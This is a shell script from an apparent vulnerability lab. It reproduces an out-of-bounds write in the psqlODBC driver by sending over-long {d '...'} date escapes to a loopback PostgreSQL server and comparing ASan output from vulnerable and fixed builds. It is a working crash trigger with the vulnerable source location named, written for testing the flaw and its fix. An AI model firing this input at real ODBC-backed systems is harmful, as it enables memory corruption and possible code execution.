#!/bin/sh
# W161: drive the pinned psqlODBC driver through unixODBC and a real,
# loopback-only PostgreSQL 16.4 server with an over-long {d} escape body.
# This exercises the second primitive (F_ExtractOldTo, pinned
# convert.c.vuln:2424 / call site :5786) on the full public-ODBC path;
# pg-replay.sh covers the {fn} param_pos primitive on the same kind of path.
# Requires replay.sh to have built the ASan vulnerable/fixed trees first.
#
# PGBIN defaults to the PostgreSQL install already provisioned under this
# plant by the datasketches lane; override with PGBIN=/path/to/pg/bin.
# The only network peer is 127.0.0.1 on PGPORT; no external probe.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
LAB=$(CDPATH= cd -- "$HERE/.." && pwd)
B="$LAB/src/repo/build"
E="$B/evidence"
PGBIN=${PGBIN:-$LAB/../../datasketches2shell-pg/pg-install/bin}
PGPORT=${PGPORT:-59434}
PD=${PGDATA:-$B/w161-pgdata}
DBUSER=$(id -un)

[ -x "$PGBIN/postgres" ] || { echo "no postgres in PGBIN=$PGBIN" >&2; exit 1; }
[ -f "$B/asan-vuln/.libs/psqlodbcw.so" ] || { echo "build ASan trees with replay.sh first" >&2; exit 1; }
mkdir -p "$E"

if [ ! -s "$PD/PG_VERSION" ]; then
  "$PGBIN/initdb" -D "$PD" -A trust -U lab --no-instructions \
    >"$E/w161-pg-initdb.log" 2>&1
fi
printf "\nlog_statement = 'all'\n" >>"$PD/postgresql.conf"

started=0
if ! "$PGBIN/pg_isready" -h 127.0.0.1 -p "$PGPORT" >/dev/null 2>&1; then
  "$PGBIN/pg_ctl" -D "$PD" -l "$PD/server.log" \
    -o "-h 127.0.0.1 -p $PGPORT -k $PD" -w start >/dev/null
  started=1
fi
trap 'if [ "$started" -eq 1 ]; then "$PGBIN/pg_ctl" -D "$PD" -m fast -w stop >/dev/null 2>&1 || true; fi' EXIT

"$PGBIN/createuser" -h 127.0.0.1 -p "$PGPORT" -U lab -s "$DBUSER" \
  >/dev/null 2>&1 || true
"$PGBIN/createdb" -h 127.0.0.1 -p "$PGPORT" -U lab lab \
  >/dev/null 2>&1 || true

gcc -g -O0 -fsanitize=address "$HERE/odbc-harness.c" -o "$B/w161-pg-harness" -lodbc

for pair in 'vuln asan-vuln' 'fixed asan-fixed'; do
  set -- $pair
  cfg=$1; tree=$2
  dir="$B/w161-pg-$cfg"
  mkdir -p "$dir"
  {
    echo '[pg2shell]'
    echo 'Description = W161 loopback real PostgreSQL DSN'
    echo 'Driver = psqlodbcw-lab'
    echo 'Server = 127.0.0.1'
    echo 'Servername = 127.0.0.1'
    echo "Port = $PGPORT"
    echo 'Database = lab'
  } >"$dir/odbc.ini"
  {
    echo '[psqlodbcw-lab]'
    echo "Driver = $B/$tree/.libs/psqlodbcw.so"
  } >"$dir/odbcinst.ini"
done

body=$(printf 'A%.0s' $(seq 1 200))
sql="SELECT {d '$body'}"
run() { # label cfg sql
  label=$1; cfg=$2; sql=$3
  out="$E/w161-pg-date-$label.out"
  ODBCSYSINI="$B/w161-pg-$cfg" ODBCINI="$B/w161-pg-$cfg/odbc.ini" \
    ASAN_OPTIONS=detect_leaks=0 timeout 30 "$B/w161-pg-harness" "$sql" exec \
    >"$out" 2>&1 || true
  printf '%-16s %s\n' "$label" \
    "$(grep -m1 -E 'WRITE of size|EXECDIRECT rc|ERROR: |DIAG ' "$out" | cut -c1-95)"
}
run vuln-long vuln "$sql"
run fixed-long fixed "$sql"
run vuln-safe vuln "SELECT {d '2000-01-01'}"
for len in 124 125 126 127 128 129 200; do
  b=$(printf 'A%.0s' $(seq 1 "$len"))
  run "vuln-l$len" vuln "SELECT {d '$b'}"
  run "fixed-l$len" fixed "SELECT {d '$b'}"
done
